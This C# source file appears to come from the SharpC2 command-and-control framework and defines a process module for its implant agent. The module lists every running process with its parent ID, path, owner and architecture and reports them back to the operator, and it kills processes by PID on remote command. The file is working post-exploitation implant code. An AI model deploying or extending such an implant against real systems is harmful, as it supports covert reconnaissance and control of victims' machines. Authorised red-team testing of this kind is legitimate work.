using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;

using static Agent.PInvoke.NativeMethods;

namespace Agent.Modules
{
    public class ProcModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Proc",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "list",
                        Delegate = ListProcesses
                    },
                    new ModuleInfo.Command
                    {
                        Name = "kill",
                        Delegate = KillProcess
                    }
                }
            };
        }

        void ListProcesses(string AgentID, C2Data C2Data)
        {
            try
            {
                var systemArch = Helpers.GetArchitecture;
                var processes = Process.GetProcesses().OrderBy(P => P.Id).ToArray();
                var results = new SharpC2ResultList<ProcessListResult>();

                foreach (var process in processes)
                {
                    var PID = process.Id;
                    var PPID = GetParentProcess(process);
                    var processName = process.ProcessName;
                    var processPath = string.Empty;
                    var sessionId = process.SessionId;
                    var owner = Helpers.GetProcessOwner(process);
                    var arch = Native.Platform.Unknown;

                    if (PPID != 0)
                    {
                        try
                        {
                            processPath = process.MainModule.FileName;
                        }
                        catch { }
                    }

                    if (systemArch == Native.Platform.x64)
                    {
                        arch = IsWow64(process) ? Native.Platform.x86 : Native.Platform.x64;
                    }
                    else if (systemArch == Native.Platform.x86)
                    {
                        arch = Native.Platform.x86;
                    }
                    else if (systemArch == Native.Platform.IA64)
                    {
                        arch = Native.Platform.IA64;
                    }

                    results.Add(new ProcessListResult
                    {
                        PID = PID,
                        PPID = PPID,
                        Name = processName,
                        Path = processPath,
                        SessionID = sessionId,
                        Owner = owner,
                        Architecture = arch
                    });
                }

                Agent.SendMessage(results.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void KillProcess(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
                var pid = (int)parameters.FirstOrDefault(p => p.Name.Equals("PID", StringComparison.OrdinalIgnoreCase)).Value;

                var process = Process.GetProcessById(pid);
                process.Kill();
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        int GetParentProcess(Process Process)
        {
            try
            {
                return GetParentProcess(Process.Handle);
            }
            catch
            {
                return 0;
            }
        }

        int GetParentProcess(IntPtr hProcess)
        {
            var pbi = new PROCESS_BASIC_INFORMATION();
            int pbiSize = Marshal.SizeOf(pbi);
            Ntdll.NtQueryInformationProcess(hProcess, (uint)PROCESSINFOCLASS.ProcessBasicInformation, ref pbi, pbiSize, out uint _);

            return (int)pbi.InheritedFromUniqueProcessId;
        }

        

        bool IsWow64(Process Process)
        {
            try
            {
                Kernel32.IsWow64Process(Process.Handle, out bool isWow64);
                return isWow64;
            }
            catch
            {
                return false;
            }
        }
    }
}